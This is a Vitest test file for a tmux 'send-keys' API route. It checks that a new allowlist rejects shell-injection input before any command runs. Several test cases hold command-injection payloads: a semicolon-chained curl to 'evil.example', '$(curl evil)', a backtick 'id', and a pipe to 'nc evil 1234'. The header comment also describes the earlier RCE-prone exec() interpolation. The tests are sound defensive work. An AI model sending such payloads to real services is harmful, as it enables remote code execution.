import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

/**
 * Tests for `/api/terminal/send-keys` with the raw-mode allowlist added in
 * the pre-v1.10.0 security-hardening PR. Exercises:
 *
 *   1. Exploit rejection — shell-metachar-laden `keys` strings must be
 *      rejected with 400 BEFORE any child_process call is made. The previous
 *      implementation interpolated `keys` into a `tmux send-keys -t SESSION
 *      ${keys}` shell template via `exec()`, so `Escape; curl evil.example`
 *      became a full RCE against the claude user.
 *   2. Happy path — a single valid raw token (`Escape`) must be routed
 *      through `execFile("tmux", ["send-keys", "-t", SESSION, "Escape"])`
 *      with no shell involvement.
 *   3. Multi-token happy path — `Escape Up Up` must split into three argv
 *      tokens and call execFile once.
 *
 * Strategy:
 *   - Mock `node:child_process` so execFile is a spy and nothing actually
 *     shells out. The spy returns success; every assertion is made on the
 *     call arguments captured by the mock.
 *   - Import the route AFTER vi.mock is declared so the hoisted mock takes
 *     effect before the route module pulls in child_process.
 *   - Drive the route via Hono's `app.request()` entry point — no port,
 *     no listener, no supertest.
 */

const execFileMock = vi.fn((_cmd: string, _args: string[], cb: any) => {
  // Node's callback-style execFile signature: (cmd, args, cb) OR (cmd, args, opts, cb).
  const callback = typeof cb === "function" ? cb : (arguments[3] as any);
  if (typeof callback === "function") {
    callback(null, { stdout: "", stderr: "" });
  }
  return { kill: () => {} } as any;
});

// exec is used by the /restart-session and literal-keys branches; keep it as
// a silent spy so unrelated endpoints don't throw during unrelated tests.
const execMock = vi.fn((_cmd: string, _opts: any, cb: any) => {
  const callback = typeof cb === "function" ? cb : (typeof _opts === "function" ? _opts : undefined);
  if (typeof callback === "function") callback(null, { stdout: "", stderr: "" });
  return { kill: () => {} } as any;
});

vi.mock("node:child_process", async () => {
  const actual = await vi.importActual<typeof import("node:child_process")>("node:child_process");
  return {
    ...actual,
    execFile: execFileMock,
    exec: execMock,
  };
});

// Import AFTER vi.mock so the route module's `promisify(exec)` / `promisify(execFile)`
// captures the mock references.
const { slashCommandsRoute } = await import("../terminal/slash-commands.js");

beforeEach(() => {
  execFileMock.mockClear();
  execMock.mockClear();
});

afterEach(() => {
  vi.clearAllMocks();
});

async function postSendKeys(body: unknown) {
  const res = await slashCommandsRoute.request("/send-keys", {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(body),
  });
  const json = (await res.json()) as { ok: boolean; error?: string; action?: string };
  return { status: res.status, body: json };
}

describe("/send-keys raw-mode allowlist (M-1)", () => {
  it("rejects a raw keys string containing a shell command separator (;)", async () => {
    const { status, body } = await postSendKeys({
      raw: true,
      keys: "Escape; curl https://evil.example",
    });
    expect(status).toBe(400);
    expect(body.ok).toBe(false);
    expect(body.error).toMatch(/invalid raw key token/);
    // Critically: execFile MUST NOT have been called. The previous
    // implementation would have shelled out before rejecting.
    expect(execFileMock).not.toHaveBeenCalled();
  });

  it("rejects a raw keys string containing a command substitution ($(...))", async () => {
    const { status, body } = await postSendKeys({
      raw: true,
      keys: "$(curl evil)",
    });
    expect(status).toBe(400);
    expect(body.error).toMatch(/invalid raw key token/);
    expect(execFileMock).not.toHaveBeenCalled();
  });

  it("rejects a raw keys string containing a backtick subshell", async () => {
    const { status } = await postSendKeys({
      raw: true,
      keys: "`id`",
    });
    expect(status).toBe(400);
    expect(execFileMock).not.toHaveBeenCalled();
  });

  it("rejects a raw keys string with a pipe to another command", async () => {
    const { status } = await postSendKeys({
      raw: true,
      keys: "Escape | nc evil 1234",
    });
    expect(status).toBe(400);
    expect(execFileMock).not.toHaveBeenCalled();
  });

  it("rejects a raw keys string that is pure whitespace", async () => {
    const { status, body } = await postSendKeys({ raw: true, keys: "   " });
    expect(status).toBe(400);
    expect(body.ok).toBe(false);
  });

  it("accepts a single valid raw key (Escape) and calls execFile with argv", async () => {
    const { status, body } = await postSendKeys({ raw: true, keys: "Escape" });
    expect(status).toBe(200);
    expect(body.ok).toBe(true);
    expect(execFileMock).toHaveBeenCalledTimes(1);
    const [cmd, args] = execFileMock.mock.calls[0];
    expect(cmd).toBe("tmux");
    expect(args).toEqual(["send-keys", "-t", expect.any(String), "Escape"]);
  });

  it("accepts a multi-token raw key string and passes each token as a separate argv entry", async () => {
    const { status } = await postSendKeys({ raw: true, keys: "Escape Up Up" });
    expect(status).toBe(200);
    expect(execFileMock).toHaveBeenCalledTimes(1);
    const [, args] = execFileMock.mock.calls[0];
    // send-keys -t SESSION Escape Up Up
    expect(args.slice(3)).toEqual(["Escape", "Up", "Up"]);
  });

  it("accepts tmux modifier keys like C-a and M-Left", async () => {
    const { status } = await postSendKeys({ raw: true, keys: "C-a M-Left S-F1" });
    expect(status).toBe(200);
    expect(execFileMock).toHaveBeenCalledTimes(1);
  });

  it("still rejects empty body with 400", async () => {
    const { status } = await postSendKeys({ raw: true, keys: "" });
    expect(status).toBe(400);
  });
});
